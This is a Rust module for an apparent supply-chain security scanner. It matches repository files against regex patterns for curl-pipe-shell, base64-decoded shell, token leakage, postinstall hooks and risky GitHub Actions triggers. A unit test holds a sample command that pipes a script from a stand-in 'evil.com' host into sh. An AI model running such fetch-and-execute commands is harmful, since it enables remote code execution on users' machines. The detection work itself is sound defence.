//! Code pattern scanning — matches `patterns.py`.
//! Scans repository files for dangerous patterns (curl-pipe-shell, secrets, workflows).

use ai_supply_chain_trust_models::{Finding, Severity};

/// Critical security patterns to scan for.
pub const CRITICAL_PATTERNS: &[(&str, &str, Severity)] = &[
    (
        "curl.*\\|.*sh",
        "curl-pipe-shell: piping curl output to shell",
        Severity::Critical,
    ),
    (
        "curl.*\\|.*bash",
        "curl-pipe-bash: piping curl to bash",
        Severity::Critical,
    ),
    (
        "wget.*-O-.*\\|.*sh",
        "wget-pipe-shell: piping wget to shell",
        Severity::Critical,
    ),
    (
        "eval\\(.*\\$\\(.*curl",
        "eval-curl: evaluating curl output",
        Severity::Critical,
    ),
    (
        "base64.*-d.*\\|.*sh",
        "base64-pipe-shell: decoding and piping to shell",
        Severity::Critical,
    ),
    (
        "process\\.env\\.(GITHUB_TOKEN|NPM_TOKEN|DOCKER_TOKEN)",
        "credential-exfiltration: env token leakage",
        Severity::High,
    ),
    (
        "git.*clone.*\\|.*cd.*&&.*\\./(install|setup)",
        "clone-install: clone and install without checksum",
        Severity::High,
    ),
    (
        "\\.postinstall.*=.*sh",
        "npm-postinstall-shell: postinstall script runs shell",
        Severity::High,
    ),
    (
        "pip install.*--extra-index-url",
        "pip-extra-index: untrusted package index",
        Severity::Medium,
    ),
    (
        "subprocess\\.(call|run|Popen)\\(.*shell=True",
        "python-shell-true: subprocess with shell=True",
        Severity::High,
    ),
];

/// Dangerously permissive GitHub Actions workflow triggers.
pub const DANGEROUS_WORKFLOW_PATTERNS: &[(&str, &str)] = &[
    ("pull_request_target", "workflow_run"),
    ("issues:.*labeled", "repository_dispatch"),
];

/// Check if a file path looks like a non-readme documentation file.
pub fn is_non_readme_doc(path: &str) -> bool {
    let lower = path.to_lowercase();
    (lower.ends_with(".md") || lower.ends_with(".rst") || lower.ends_with(".txt"))
        && !lower.contains("readme")
        && !lower.contains("security")
        && !lower.contains("contributing")
}

/// Scan a single file's content for dangerous patterns.
pub fn scan_file_content(path: &str, content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    for (pattern, description, severity) in CRITICAL_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern) {
            if re.is_match(content) {
                findings.push(
                    Finding::new(*pattern, *severity, format!("{description} in {path}"))
                        .with_evidence(snippet(content, pattern)),
                );
            }
        }
    }
    findings
}

/// Scan dangerous GitHub Actions workflows.
pub fn scan_dangerous_workflows(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    for (trigger, event) in DANGEROUS_WORKFLOW_PATTERNS {
        let pattern = format!("{trigger}.*:");
        if let Ok(re) = regex::Regex::new(&pattern) {
            if re.is_match(content) {
                findings.push(
                    Finding::new(
                        "dangerous_workflow",
                        Severity::Critical,
                        format!("Dangerous workflow trigger: {trigger} with {event} event"),
                    )
                    .with_automatic_fail(),
                );
            }
        }
    }
    findings
}

fn snippet(content: &str, _pattern: &str) -> String {
    let lines: Vec<&str> = content.lines().take(3).collect();
    let joined = lines.join(" ");
    if joined.len() > 200 {
        format!("{}...", &joined[..197])
    } else {
        joined
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_curl_pipe_shell() {
        let findings = scan_file_content("install.sh", "curl -s https://evil.com/script | sh");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn detects_dangerous_workflow() {
        let findings =
            scan_dangerous_workflows("on:\n  pull_request_target:\n    types: [labeled]");
        assert!(!findings.is_empty());
    }

    #[test]
    fn clean_file_no_findings() {
        let findings = scan_file_content("readme.md", "# Hello World\nThis is a readme.");
        assert!(findings.is_empty());
    }
}
